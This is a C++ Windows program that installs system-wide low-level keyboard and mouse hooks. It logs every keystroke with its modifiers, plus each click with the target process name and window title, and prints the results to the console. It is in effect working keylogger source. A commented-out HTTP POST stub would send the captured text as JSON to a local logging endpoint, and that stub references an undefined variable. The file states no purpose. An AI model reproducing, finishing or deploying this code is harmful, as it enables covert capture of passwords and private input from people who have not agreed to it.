#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <cpr/cpr.h>

#include "layouts.h"

const char *DEBUG_URL = "http://127.0.0.1:8000/log";

const std::unordered_map<int, const char *> MOUSE_EVENT_TO_STRING{
    {VK_LBUTTON, "Left Click"}, {VK_RBUTTON, "Right Click"}
};

boolean checkModifierStatus(const int vkCode) {
    return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
};

void addCombinationModifier(std::string *input) {
    if (checkModifierStatus(VK_CONTROL)) {
        *input += "CTRL + ";
    }
    if (checkModifierStatus(VK_SHIFT)) {
        *input += "SHIFT + ";
    }
    if (checkModifierStatus(VK_MENU)) {
        *input += "ALT + ";
    }
    if (checkModifierStatus(VK_LWIN) || checkModifierStatus(VK_RWIN)) {
        *input += "WIN + ";
    }
}

std::unordered_set<int> pressedKeys;

LRESULT CALLBACK KeyboardCallback(const int nCode, const WPARAM wParam, const WPARAM lParam) {
    const auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        if (pressedKeys.contains(kbStruct->vkCode)) {
            return CallNextHookEx(nullptr, nCode, wParam, lParam);
        }

        pressedKeys.insert(kbStruct->vkCode);

        char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);

        std::string final;
        addCombinationModifier(&final);

        if (scanCodeMapFI.contains(kbStruct->scanCode)) {
            final += scanCodeMapFI[kbStruct->scanCode];
        }

        printf("%s\n", final.c_str());

        //const cpr::Response r = cpr::Post(cpr::Url{DEBUG_URL}, cpr::Header{{"Content-Type", "application/json"}},
        // cpr::Body{"{\"text\": \"" + body + "\"}"});

        // printf("%s\n", r.text.c_str());
    } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
        pressedKeys.erase(kbStruct->vkCode);
    }

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

struct ClickInfo {
    DWORD64 clickTime;
    POINT pos;
    int type;
} typedef ClickInfo;

std::unordered_map<int, ClickInfo> clickMap;

constexpr int doubleClickThresholdMS = 300;
constexpr int doubleClickDistThreshold = 5;

LRESULT CALLBACK MouseCallback(const int nCode, const WPARAM wParam, const WPARAM lParam) {
    const auto *mouseStruct = reinterpret_cast<MOUSEHOOKSTRUCT *>(lParam);
    const auto point = mouseStruct->pt;

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        int button = (wParam == WM_LBUTTONDOWN) ? VK_LBUTTON : (wParam == WM_RBUTTONDOWN) ? VK_RBUTTON : VK_MBUTTON;

        const HWND window = WindowFromPoint(point);

        constexpr size_t len = 256;
        char title_buffer[len] = {0};

        GetWindowTextA(window, title_buffer, len);

        DWORD procID;
        GetWindowThreadProcessId(window, &procID);

        char proc_buffer[len] = {0};

        if (const HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, procID)) {
            GetModuleBaseNameA(procHandle, nullptr, proc_buffer, len);
            CloseHandle(procHandle);
        }

        ClickInfo &lastClick = clickMap[button];

        const DWORD64 curTime = GetTickCount64();
        bool isDBLClick = false;

        if (lastClick.type == button && curTime - lastClick.clickTime <= doubleClickThresholdMS) {
            if (abs(lastClick.pos.x - point.x) < doubleClickDistThreshold &&
                abs(lastClick.pos.y - point.y) < doubleClickDistThreshold) {
                isDBLClick = true;
            }
        }

        if (isDBLClick) {
            printf("Double %s in %s (%s)\n", MOUSE_EVENT_TO_STRING.at(button), proc_buffer, title_buffer);
        } else {
            printf("%s in %s (%s)\n", MOUSE_EVENT_TO_STRING.at(button), proc_buffer, title_buffer);
        }

        lastClick.clickTime = curTime;
        lastClick.pos = point;
        lastClick.type = button;
    }


    //printf("x: %d, y: %d\n", point.x, point.y);

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

int main() {
    const HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, reinterpret_cast<HOOKPROC>(&KeyboardCallback), nullptr, 0);
    const HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, reinterpret_cast<HOOKPROC>(&MouseCallback), nullptr, 0);

    MSG message;
    while (GetMessage(&message, nullptr, 0, 0) > 0) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboard);
    UnhookWindowsHookEx(mouse);

    return 0;
}
